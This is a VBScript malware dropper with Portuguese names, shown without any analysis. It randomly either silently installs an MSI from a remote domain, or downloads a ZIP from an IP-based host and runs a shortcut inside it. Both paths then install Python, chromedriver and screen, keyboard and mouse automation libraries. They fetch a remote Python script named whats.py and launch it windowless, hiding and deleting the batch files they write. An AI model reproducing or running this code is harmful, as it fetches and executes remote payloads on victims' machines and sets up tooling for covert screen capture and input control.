Option Explicit

Dim objShell, objFSO
Dim randomEscolha

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Randomize
randomEscolha = Int(2 * Rnd)

If randomEscolha = 0 Then
    ExecutarMSI
Else
    BaixarZipEExecLnk "https://215.176.153.160.host.secureserver.net/986495423y5o2/986fdg9/202529834759629"
    WScript.Sleep 2000
    InstalarPythonEDependencias
End If

Set objFSO = Nothing
Set objShell = Nothing

' ===== SUB EXECUTAR MSI (SCRIPT ORIGINAL) =====
Sub ExecutarMSI()
    Dim objFile, strBatFile, strMsiUrl
    
    strMsiUrl = "https://empautlipa.com/altor/installer.msi"
    
    If Not objFSO.FolderExists("C:\temp") Then
        objFSO.CreateFolder("C:\temp")
    End If
    
    strBatFile = "C:\temp\instalar.bat"
    Set objFile = objFSO.CreateTextFile(strBatFile, True)
    objFile.WriteLine "@echo off"
    objFile.WriteLine "if not exist C:\temp mkdir C:\temp"
    objFile.WriteLine "cd C:\temp"
    objFile.WriteLine ""
    objFile.WriteLine "rem ===== BAIXAR E INSTALAR MSI ====="
    objFile.WriteLine "powershell -Command ""Invoke-WebRequest '" & strMsiUrl & "' -OutFile instalador.msi"""
    objFile.WriteLine "start /wait msiexec.exe /i instalador.msi /qn /norestart"
    objFile.WriteLine "del instalador.msi"
    objFile.WriteLine ""
    objFile.WriteLine "rem ===== PYTHON ====="
    objFile.WriteLine "if not exist python.exe ("
    objFile.WriteLine " powershell -Command ""Invoke-WebRequest 'https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip' -OutFile python.zip"""
    objFile.WriteLine " powershell -Command ""Expand-Archive python.zip . -Force"""
    objFile.WriteLine " del python.zip"
    objFile.WriteLine ")"
    objFile.WriteLine ""
    objFile.WriteLine "rem ===== CHROMEDRIVER ====="
    objFile.WriteLine "if not exist chromedriver.exe ("
    objFile.WriteLine " powershell -Command ""$chromePath = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe' -ErrorAction SilentlyContinue; if(!$chromePath){$chromePath = Get-ItemProperty 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe' -ErrorAction SilentlyContinue}; if($chromePath){$version = (Get-Item $chromePath.'(Default)').VersionInfo.FileVersion; $majorVersion = $version.Split('.')[0]; $jsonUrl = 'https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json'; $json = Invoke-WebRequest $jsonUrl | ConvertFrom-Json; $chromeVersions = $json.versions | Where-Object {$_.version -like ($majorVersion + '.*')}; $latestVersion = $chromeVersions[-1]; $driverUrl = $latestVersion.downloads.chromedriver | Where-Object {$_.platform -eq 'win64'} | Select-Object -ExpandProperty url -First 1; if(!$driverUrl){$driverUrl = 'https://storage.googleapis.com/chrome-for-testing-public/130.0.6723.93/win64/chromedriver-win64.zip'}; Invoke-WebRequest $driverUrl -OutFile driver.zip}else{Invoke-WebRequest 'https://storage.googleapis.com/chrome-for-testing-public/130.0.6723.93/win64/chromedriver-win64.zip' -OutFile driver.zip}"""
    objFile.WriteLine " powershell -Command ""Expand-Archive driver.zip temp -Force"""
    objFile.WriteLine " move temp\chromedriver-win64\chromedriver.exe ."
    objFile.WriteLine " rmdir /s /q temp"
    objFile.WriteLine " del driver.zip"
    objFile.WriteLine ")"
    objFile.WriteLine ""
    objFile.WriteLine "("
    objFile.WriteLine "echo python312.zip"
    objFile.WriteLine "echo ."
    objFile.WriteLine "echo Lib"
    objFile.WriteLine "echo Lib\site-packages"
    objFile.WriteLine "echo import site"
    objFile.WriteLine ") > python312._pth"
    objFile.WriteLine ""
    objFile.WriteLine "powershell -Command ""Invoke-WebRequest 'https://bootstrap.pypa.io/get-pip.py' -OutFile get-pip.py"""
    objFile.WriteLine "python.exe get-pip.py >nul 2>&1"
    objFile.WriteLine ""
    objFile.WriteLine "python.exe -m pip install setuptools wheel pywin32 >nul 2>&1"
    objFile.WriteLine "python.exe -m pip install requests Pillow numpy opencv-python >nul 2>&1"
    objFile.WriteLine "python.exe -m pip install pyautogui keyboard mouse pygetwindow >nul 2>&1"
    objFile.WriteLine "python.exe -m pip install pytesseract selenium packaging webdriver-manager >nul 2>&1"
    objFile.WriteLine ""
    objFile.WriteLine "powershell -Command ""Invoke-WebRequest 'https://empautlipa.com/altor/vbiud.py' -OutFile whats.py"""
    objFile.WriteLine ""
    objFile.WriteLine "timeout /t 2 /nobreak >nul"
    objFile.WriteLine "start """" /b pythonw.exe whats.py"
    objFile.WriteLine "exit"
    objFile.Close
    
    objShell.Run strBatFile, 0, True
    objFSO.DeleteFile strBatFile
    
    Set objFile = Nothing
End Sub

' ===== FUNCTION BAIXAR ZIP E EXECUTAR LNK =====
Function BaixarZipEExecLnk(urlZip)
    Dim objHTTP, objZipFile, objPasta, pastaDestino, caminhoZip, caminhoLnk, shellApp
    
    On Error Resume Next
    
    pastaDestino = objShell.ExpandEnvironmentStrings("%TEMP%") & "\VBS_Exec_" & Int(Rnd() * 100000)
    
    If Not objFSO.FolderExists(pastaDestino) Then
        objFSO.CreateFolder(pastaDestino)
    End If
    
    caminhoZip = pastaDestino & "\temp_arquivo.zip"
    
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", urlZip, False
    objHTTP.Send
    
    If objHTTP.Status = 200 Then
        Dim objStream
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1
        objStream.Open
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile caminhoZip, 2
        objStream.Close
        Set objStream = Nothing
        
        Set shellApp = CreateObject("Shell.Application")
        Set objZipFile = shellApp.NameSpace(caminhoZip)
        Set objPasta = shellApp.NameSpace(pastaDestino)
        
        objPasta.CopyHere objZipFile.Items, 20
        WScript.Sleep 3000
        
        caminhoLnk = ProcurarArquivoLnk(pastaDestino)
        
        If caminhoLnk <> "" Then
            objShell.Run caminhoLnk, 1, False
        End If
        
        objFSO.DeleteFile caminhoZip, True
    End If
    
    Set objHTTP = Nothing
End Function

' ===== SUB INSTALAR PYTHON E DEPENDENCIAS (PARA LNK) =====
Sub InstalarPythonEDependencias()
    Dim objFile, strBatFile
    
    If Not objFSO.FolderExists("C:\temp") Then
        objFSO.CreateFolder("C:\temp")
    End If
    
    strBatFile = "C:\temp\python_install.bat"
    Set objFile = objFSO.CreateTextFile(strBatFile, True)
    objFile.WriteLine "@echo off"
    objFile.WriteLine "cd C:\temp"
    objFile.WriteLine ""
    objFile.WriteLine "rem ===== PYTHON ====="
    objFile.WriteLine "if not exist python.exe ("
    objFile.WriteLine " powershell -Command ""Invoke-WebRequest 'https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip' -OutFile python.zip"""
    objFile.WriteLine " powershell -Command ""Expand-Archive python.zip . -Force"""
    objFile.WriteLine " del python.zip"
    objFile.WriteLine ")"
    objFile.WriteLine ""
    objFile.WriteLine "rem ===== CHROMEDRIVER ====="
    objFile.WriteLine "if not exist chromedriver.exe ("
    objFile.WriteLine " powershell -Command ""$chromePath = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe' -ErrorAction SilentlyContinue; if(!$chromePath){$chromePath = Get-ItemProperty 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe' -ErrorAction SilentlyContinue}; if($chromePath){$version = (Get-Item $chromePath.'(Default)').VersionInfo.FileVersion; $majorVersion = $version.Split('.')[0]; $jsonUrl = 'https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json'; $json = Invoke-WebRequest $jsonUrl | ConvertFrom-Json; $chromeVersions = $json.versions | Where-Object {$_.version -like ($majorVersion + '.*')}; $latestVersion = $chromeVersions[-1]; $driverUrl = $latestVersion.downloads.chromedriver | Where-Object {$_.platform -eq 'win64'} | Select-Object -ExpandProperty url -First 1; if(!$driverUrl){$driverUrl = 'https://storage.googleapis.com/chrome-for-testing-public/130.0.6723.93/win64/chromedriver-win64.zip'}; Invoke-WebRequest $driverUrl -OutFile driver.zip}else{Invoke-WebRequest 'https://storage.googleapis.com/chrome-for-testing-public/130.0.6723.93/win64/chromedriver-win64.zip' -OutFile driver.zip}"""
    objFile.WriteLine " powershell -Command ""Expand-Archive driver.zip temp -Force"""
    objFile.WriteLine " move temp\chromedriver-win64\chromedriver.exe ."
    objFile.WriteLine " rmdir /s /q temp"
    objFile.WriteLine " del driver.zip"
    objFile.WriteLine ")"
    objFile.WriteLine ""
    objFile.WriteLine "("
    objFile.WriteLine "echo python312.zip"
    objFile.WriteLine "echo ."
    objFile.WriteLine "echo Lib"
    objFile.WriteLine "echo Lib\site-packages"
    objFile.WriteLine "echo import site"
    objFile.WriteLine ") > python312._pth"
    objFile.WriteLine ""
    objFile.WriteLine "powershell -Command ""Invoke-WebRequest 'https://bootstrap.pypa.io/get-pip.py' -OutFile get-pip.py"""
    objFile.WriteLine "python.exe get-pip.py >nul 2>&1"
    objFile.WriteLine ""
    objFile.WriteLine "python.exe -m pip install setuptools wheel pywin32 >nul 2>&1"
    objFile.WriteLine "python.exe -m pip install requests Pillow numpy opencv-python >nul 2>&1"
    objFile.WriteLine "python.exe -m pip install pyautogui keyboard mouse pygetwindow >nul 2>&1"
    objFile.WriteLine "python.exe -m pip install pytesseract selenium packaging webdriver-manager >nul 2>&1"
    objFile.WriteLine ""
    objFile.WriteLine "powershell -Command ""Invoke-WebRequest 'https://empautlipa.com/altor/vbiud.py' -OutFile whats.py"""
    objFile.WriteLine ""
    objFile.WriteLine "timeout /t 2 /nobreak >nul"
    objFile.WriteLine "start """" /b pythonw.exe whats.py"
    objFile.WriteLine "exit"
    objFile.Close
    
    objShell.Run strBatFile, 0, True
    objFSO.DeleteFile strBatFile
    
    Set objFile = Nothing
End Sub

' ===== FUNCTION PROCURAR .LNK =====
Function ProcurarArquivoLnk(pasta)
    Dim objPasta, arquivo, subPasta
    
    On Error Resume Next
    
    Set objPasta = objFSO.GetFolder(pasta)
    
    For Each arquivo In objPasta.Files
        If LCase(objFSO.GetExtensionName(arquivo.Name)) = "lnk" Then
            ProcurarArquivoLnk = arquivo.Path
            Exit Function
        End If
    Next
    
    For Each subPasta In objPasta.SubFolders
        ProcurarArquivoLnk = ProcurarArquivoLnk(subPasta.Path)
        If ProcurarArquivoLnk <> "" Then
            Exit Function
        End If
    Next
    
    ProcurarArquivoLnk = ""
End Function